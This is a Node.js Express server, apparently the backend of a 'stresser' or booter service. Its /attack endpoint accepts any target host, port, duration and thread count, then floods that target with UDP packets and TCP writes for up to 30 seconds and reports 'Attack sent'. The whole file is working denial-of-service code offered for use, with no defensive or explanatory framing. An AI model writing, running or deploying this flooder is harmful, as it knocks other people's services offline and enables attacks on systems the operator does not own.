const http = require('http');
const https = require('https');
const dns = require('dns');
const dgram = require('dgram');
const net = require('net');
const express = require('express');

const app = express();

function getIpFromUrl(url) {
    return new Promise((resolve, reject) => {
        dns.lookup(url, (err, address) => {
            if (err) {
                reject("Hostname could not be resolved.");
            } else {
                resolve(address);
            }
        });
    });
}

function mixAttack(target, port, duration, threads) {
    if (duration > 30) duration = 30;

    const endTime = Date.now() + (duration * 1000);

    const flood = () => {
        while (Date.now() < endTime) {
            try {
                // UDP attack
                const udpClient = dgram.createSocket('udp4');
                const udpMessage = Buffer.from(Array(1028).fill('x'));
                udpClient.send(udpMessage, port, target, (err) => {
                    udpClient.close();
                });

                // TCP attack
                const tcpClient = new net.Socket();
                tcpClient.connect(port, target, () => {
                    tcpClient.write(Buffer.from(Array(1000).fill('x')));
                    tcpClient.end();
                });
            } catch (error) {
                console.error(error);
            }
        }
    };

    for (let i = 0; i < threads; i++) {
        setTimeout(flood, 0);
    }
}

app.get('/attack/:target/:port/:duration/:threads', async (req, res) => {
    try {
        const target = req.params.target;
        const port = parseInt(req.params.port);
        const duration = parseInt(req.params.duration);
        const threads = parseInt(req.params.threads);

        let ip = target;
        if (target.startsWith('http://') || target.startsWith('https://')) {
            ip = new URL(target).hostname;
        }

        if (!ip.match(/^\d{1,3}(\.\d{1,3}){3}$/)) {
            ip = await getIpFromUrl(ip);
        }

        mixAttack(ip, port, duration, threads);
        res.json({ status: "Attack sent", target: ip, method: "mix" });
    } catch (error) {
        res.status(500).json({ error: error.toString() });
    }
});

app.listen(6372, '0.0.0.0', () => {
    console.log('Server is running on port 6372');
});